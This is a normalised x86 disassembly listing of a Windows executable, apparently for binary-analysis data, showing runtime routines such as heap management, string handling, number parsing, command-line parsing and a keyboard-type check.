cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f78
test al al
jne r-xdata
mov eax esi
call sub_401fd8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a0c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402274
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401368
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402004
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401370
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b20
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b20
jmp r-xdata
sub_402288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40241a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401368
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401370
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403b20
jmp r-xdata
call sub_401ea0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bb0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e18
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bb0
sub_40242c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ea0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bb0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fa4
test al al
je r-xdata
call sub_401bb0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c74
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e18
jmp r-xdata
sub_402608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026b9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40242c
test al al
je r-xdata
push rw-data
call sub_401368
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020f8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028c8
mov eax ebx
call sub_402288
retn
push rw-data
call sub_401370
sub_4026cc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402828
sub_4026ec
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402828
sub_40270c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402828
mov [ ecx ] eax
mov al 0x2
jmp sub_402828
retn
mov [ ecx ] eax
retn
sub_40279c
push ebx
push esi
call sub_406064
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406064
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406064
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027dc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406064
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027d0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402864
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028c8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402908
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40122c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_404684
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40122c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40122c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
push ebx
call sub_40122c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40122c
mov ebx eax
jmp r-xdata
push ebx
call sub_40122c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029f4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404038
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40126c
mov ecx eax
mov edx esp
mov eax ebx
call sub_404128
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402908
mov edi eax
test esi esi
je r-xdata
sub_402a84
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402ac4
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402854
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b18
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402854
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402854
jmp r-xdata
sub_402b70
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402bac
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_402bc8
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c4c
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402cbc
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402cdc
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402dbc
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402dfc
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eaf ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eaf ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402eaf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4030e8
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403118
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403189
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
retn
sub_40320c
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4032b4
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_40330c
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404aa0
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_40332c
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_40594c
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_40335c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033e0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033f0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033e7
lea eax [ ebp - 0x8 ]
call sub_405934
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_40332c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40594c
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033f0
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403434
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4034d4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403474
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4034a4
push eax
push ecx
mov eax [ eax ]
call sub_403474
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_40402c
call [ rw-data ]
sub_4034bc
push esi
mov esi edx
mov eax [ eax ]
call sub_403474
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_40402c
call [ rw-data ]
sub_403504
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403474
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_40352c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_40357c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_4035bc
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
